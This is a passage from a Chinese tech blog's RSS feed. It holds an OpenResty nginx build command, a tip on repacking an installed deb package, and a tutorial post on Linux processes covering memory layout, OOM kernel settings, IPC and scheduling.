<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">./configure</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--prefix=/usr/local/openresty/nginx </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-cc-opt=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'-O2 \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">-DNGX_LUA_ABORT_AT_PANIC \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">-I/usr/local/openresty/zlib/include \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">-I/usr/local/openresty/pcre/include \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">-I/usr/local/openresty/openssl111/include'</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../ngx_devel_kit-0.3.3 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../echo-nginx-module-0.63 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../xss-nginx-module-0.06 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../ngx_coolkit-0.2 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../set-misc-nginx-module-0.33 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../form-input-nginx-module-0.12 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../encrypted-session-nginx-module-0.09 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../srcache-nginx-module-0.33 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../ngx_lua-0.10.26 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../ngx_lua_upstream-0.07 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../headers-more-nginx-module-0.37 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../array-var-nginx-module-0.06 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../memc-nginx-module-0.20 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../redis2-nginx-module-0.15 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../redis-nginx-module-0.3.9 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--add-module=../ngx_stream_lua-0.0.14 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-ld-opt=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'-Wl,-rpath,/usr/local/openresty/luajit/lib \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">-L/usr/local/openresty/zlib/lib \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">-L/usr/local/openresty/pcre/lib \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">-L/usr/local/openresty/openssl111/lib \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">-Wl,-rpath,/usr/local/openresty/zlib/lib:/usr/local/openresty/pcre/lib:/usr/local/openresty/openssl111/lib'</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-cc=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'ccache gcc -fdiagnostics-color=always'</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-pcre-jit </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-stream </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-stream_ssl_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-stream_ssl_preread_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_v2_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--without-mail_pop3_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--without-mail_imap_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--without-mail_smtp_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_stub_status_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_realip_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_addition_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_auth_request_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_secure_link_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_random_index_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_gzip_static_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_sub_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_dav_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_flv_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_mp4_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_gunzip_module </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-threads </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-compat </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-stream </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--without-pcre2 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">--with-http_ssl_module</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Ubuntu的deb包重新打包</title>
      <link>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E7%9A%84deb%E5%8C%85%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85.html</link>
      <guid>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E7%9A%84deb%E5%8C%85%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Ubuntu的deb包重新打包</source>
      <description>Ubuntu的deb包重新打包 deb包安装之后就会被apt工具删除，怎么才能给它回归成deb包呢？ 命令</description>
      <pubDate>Sat, 15 Jun 2024 14:52:35 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>deb包安装之后就会被apt工具删除，怎么才能给它回归成deb包呢？</p>
</blockquote>
<h2>命令</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">dpkg-repack</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> com.github.clash-for-windows</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>什么是进程</title>
      <link>https://www.geekery.cn/note-book/OperaSystems/%E4%BB%80%E4%B9%88%E6%98%AF%E8%BF%9B%E7%A8%8B.html</link>
      <guid>https://www.geekery.cn/note-book/OperaSystems/%E4%BB%80%E4%B9%88%E6%98%AF%E8%BF%9B%E7%A8%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">什么是进程</source>
      <description>什么是进程 进程: 运行中的程序的一个副本，是被载入内存的一个指令集合，是资源分配的单位 进程ID（Process ID，PID）号码被用来标记各个进程 UID、GID、和SELinux语境决定对文件系统的存取和访问权限 通常从执行进程的用户来继承 存在生命周期 进程创建 init：第一个进程，从 CentOS 7 以后为systemd 进程：都由其父...</description>
      <pubDate>Fri, 14 Jun 2024 15:53:43 GMT</pubDate>
      <content:encoded><![CDATA[
<p>进程:</p>
<ul>
<li>运行中的程序的一个副本，是被载入内存的一个指令集合，是资源分配的单位</li>
<li>进程ID（Process ID，PID）号码被用来标记各个进程</li>
<li>UID、GID、和SELinux语境决定对文件系统的存取和访问权限</li>
<li>通常从执行进程的用户来继承</li>
<li>存在生命周期</li>
</ul>
<h2>进程创建</h2>
<ul>
<li>init：第一个进程，从 CentOS 7 以后为systemd</li>
<li>进程：都由其父进程创建，fork()，父子关系，CoW：Copy On Write​</li>
</ul>
<p>刚创建时，共用父进程的内存，有新数据像刚创建的子进程写入时，单独开辟一个内存空间，把父进程内存复制一份给子进程做数据修改
​</p>
<h2>通过pid获取运行的真实程序</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  !!</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">面试题</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> ps</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aux</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ssh</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> ll</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /prox/ssh的pid/exe</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /prox/ssh的pid/status</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>物理地址空间和虚拟地址空间</h2>
<ul>
<li>
<p>MMU：Memory Management Unit 负责虚拟地址转换为物理地址
程序在访问一个内存地址指向的内存时,CPU不是直接把这个地址送到内存总线上,而是被送到MMU（Memory Management Unit),然后把这个内存地址映射到实际的物理内存地址上，然后通过总线再去访问内存，程序操作的地址称为虚拟内存地址</p>
</li>
<li>
<p>TLB：Translation Lookaside Buffer 翻译后备缓冲器，用于保存虚拟地址和物理地址映射关系的缓存</p>
</li>
<li>
<p>空间分配：程序申请的内存，申请内存是一个值，内核根据他使用的空间给的是最小值，其申请的理想空间是线性空间（虚拟空间），真实分配的是物理地址中可能断续的地址</p>
</li>
</ul>
<h2>C代码和内存布局之间的对应关系</h2>
<p>每个进程都包括5种不同的数据段</p>
<ul>
<li>代码段：用来存放可执行文件的操作指令，也就是说是它是可执行程序在内存中的镜像。代码段需要防止在运行时被非法修改，所以只准许读取操作，而不允许写入（修改）操作——它是不可写的</li>
<li>数据段：用来存放可执行文件中已初始化全局变量，换句话说就是存放程序静态分配的变量和全局变量</li>
<li>BSS段：Block Started by Symbol”的缩写,意为“以符号开始的块，BSS段包含了程序中未初始化的全局变量，在内存中 bss段全部置零</li>
<li>堆（heap）：存放数组和对象，堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）</li>
<li>栈：栈是用户存放程序临时创建的局部变量，也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的后进先出特点，所以栈特别方便用来保存/恢复调用现场。可以把堆栈看成一个寄存、交换临时数据的内存区</li>
</ul>
<h2>进程使用内存问题</h2>
<ul>
<li>
<p>内存泄漏：Memory Leak
指程序中用malloc或new申请了一块内存，但是没有用free或delete将内存释放，导致这块内存一直处于占用状态</p>
</li>
<li>
<p>内存溢出：Memory Overflow
指程序申请了10M的空间，但是在这个空间写入10M以上字节的数据，就是溢出</p>
</li>
<li>
<p>内存不足：OOM
Out Of Memory，“内存用完了”, 在情况在java程序中比较常见。系统会选一个进程将之杀死，在日志messages中看到类似下面的提示</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kernel:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Out</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> memory:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Kill</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 9527</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (java) score 88 or sacrifice child</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>当JVM因为没有足够的内存来为对象分配空间并且垃圾回收器也已经没有空间可回收时，就会抛出这个error，因为这个问题已经严重到不足以被应用处理）</p>
</li>
</ul>
<p>原因：</p>
<blockquote>
<p>给应用分配内存太少：比如虚拟机本身可使用的内存（一般通过启动时的VM参数指定）太少
应用用的太多，并且用完没释放，浪费了。此时就会造成内存泄露或者内存溢出</p>
</blockquote>
<p>使用的解决办法：</p>
<ol>
<li>限制java进程的max heap，并且降低java程序的worker数量，从而降低内存使用</li>
<li>给系统增加swap空间</li>
</ol>
<p>设置内核参数（不推荐）：
不允许内存申请过量：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/proc/sys/vm/overcommit_memory</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 80</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/proc/sys/vm/overcommit_ratio</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/proc/sys/vm/panic_on_oom</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>说明：
默认内存分配是申请多少就给多少（大部分用不到那么多）如果超出分的空间，就采用OOM killer机制
作用是选出一个进程来杀掉，来腾出内存空间，如果还不够就继续杀，一般占用资源越大的被杀几率越大</p>
<p>vm.panic_con_oom，发生oom时进行的操作设置，取值是：</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>0  默认值，当出现oom的时候，触发oom killer</span></span>
<span class="line"><span>1  程序在有cpuset、memory policy、memcg的约束情况下的OOM，可以考虑不panic，而是启动OOM killer。其它情况触发 kernel panic，即系统直接重启</span></span>
<span class="line"><span>2   当出现oom，直接触发kernel panic，即系统直接重启</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>vm.overcommit_memory 接受三种取值:</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>0   Heuristic overcommit handling. 这是缺省值，它允许overcommit，但过于明目张胆的overcommit会被拒绝，比如malloc一次性申请的内存大小就超过了系统总内存。Heuristic的意思是“试\探式的”，内核利用某种算法猜测你的内存申请是否合理，它认为不合理就会拒绝overcommit</span></span>
<span class="line"><span>1   Always overcommit. 允许overcommit，对内存申请来者不拒。内核执行无内存过量使用处理。使用这个设置会增大内存超载的可能性，但也可以增强大量使用内存任务的性能</span></span>
<span class="line"><span>2   Don’t overcommit. 禁止overcommit。内存拒绝等于或者大于总可用swap大小以及overcommit_ratio 指定的物理 RAM比例的内存请求。如果您希望减小内存过度使用的风险，这个设置就是最好的</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>申请内存的算法：
单次申请的内存大小不能超过以下值，否则本次申请就会失败</p>
<p>free memory + free swap + pagecache的大小 + SLAB</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>kernel设有一个阈值，申请的内存总数超过这个阈值就算overcommit，在/proc/meminfo中可以看到这个阈值的大小</span></span>
<span class="line"><span>查看阀值大小：grep -i commit /proc/meminfo</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>vm.overcommit_ratio</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>内核参数，缺省值是50，表示物理内存的50%。如果你不想使用比率，也可以直接指定内存的字节数大小，通过另一个内核参数 vm.overcommit_kbytes 即可；</span></span>
<span class="line"><span>如果使用了huge pages，那么需要从物理内存中减去，公式变成</span></span>
<span class="line"><span>CommitLimit = ([total RAM] – [total huge TLB RAM]) * vm.overcommit_ratio / 100 + swap</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>进程状态</h2>
<p>进程更多的状态：</p>
<ul>
<li>运行态：running</li>
<li>就绪态：ready</li>
<li>睡眠态：分为两种，可中断：interruptable，不可中断：uninterruptable</li>
<li>停止态：stopped，暂停于内存，但不会被调度，除非手动启动</li>
<li>僵死态：zombie，僵尸态，结束进程，父进程结束前，子进程不关闭，杀死父进程可以关闭僵死态的子进程</li>
</ul>
<h2>LRU算法</h2>
<p>Least Recently Used 近期最少使用算法（喜新厌旧），释放内存</p>
<h2>IPC进程间通信</h2>
<p>IPC: Inter Process Communication</p>
<p>同一主机：</p>
<ul>
<li>
<p>pipe   管道,单向传输，1v1</p>
</li>
<li>
<p>socket   套接字文件</p>
</li>
<li>
<p>Memory-maped file   文件映射,将文件中的一段数据映射到物理内存，多个进程共享这片内存</p>
</li>
<li>
<p>shm shared memory  共享内存</p>
</li>
<li>
<p>signal   信号</p>
</li>
<li>
<p>Lock    对资源上锁，如果资源已被某进程锁住，则其它进程想修改甚至读取这些资源，都将被阻塞，直到锁被打开</p>
</li>
<li>
<p>semaphore  信号量，一种计数器</p>
</li>
</ul>
<p>不同主机：</p>
<ul>
<li>
<p>socket=IP和端口号</p>
</li>
<li>
<p>RPC remote procedure call</p>
</li>
<li>
<p>MQ消息队列，生产者和消费者，如：Kafka，RabbitMQ，ActiveMQ</p>
</li>
</ul>
<p>例： 创建管道文件，实现两个进程通信
1 号终端：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mkfifo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xxxx</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">xxxx</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">12345</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2号终端：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xxxx</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #此时能动态显示1号终端输出的内容</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>进程优先级</h2>
<ul>
<li>
<p>系统优先级： 0-139，数字越小，优先级越高
（CentOS 4,5），各有140个运行队列和过期队列
0-98，99（CentOS 6）</p>
</li>
<li>
<p>实时优先级： 0-99
静态优先级： 100-139,此对应的是nice值：-20~19
Big O：
时间（空间）复杂度，用时（空间）和规模的关系O(1), O(logn), O(n)线性, O(n^2)抛物线, O(2^n)</p>
</li>
</ul>
<p>进程调度机制：</p>
<ul>
<li>
<p>总共有280个队列</p>
<ul>
<li>
<p>其中140个队列对应优先级，也叫运行队列，如1号队列对应0优先级，以此类推；</p>
</li>
<li>
<p>另外140个队列对应优先级的过期队列，如1号过期队列是对应0优先级，以此类推。两个对应关系的队列会进行交替</p>
</li>
</ul>
</li>
</ul>
<p>所有的进程，按各自的优先级进入对应的运行队列，运行完后会进入过期队列，当运行队列执行完成，就会执行过期队列，此时过期队列变成运行队列，之前的运行队列变成过期队列，存放新运行完的进程</p>
<h2>IO调度算法</h2>
<ul>
<li>NOOP</li>
<li>Deadline scheduler</li>
<li>Anticipatory scheduler</li>
<li>CFQ</li>
</ul>
<p>查看系统IO算法：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /sys/block/sda/queue/scheduler</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>密码生成器</title>
      <link>https://www.geekery.cn/free-service/random-password.html</link>
      <guid>https://www.geekery.cn/free-service/random-password.html</guid>
      <source url="https://www.geekery.cn/rss.xml">密码生成器</source>
      <description>密码生成器 生成随机密码。 密码随机生成是一个用于生成随机密码的工具。它可以帮助用户创建强密码，以提高帐户的安全性。 源码开源在 GitHub 仓库 , 目前已经更新为vue版本。</description>
      <category>Tools</category>
      <pubDate>Mon, 10 Jun 2024 06:02:26 GMT</pubDate>
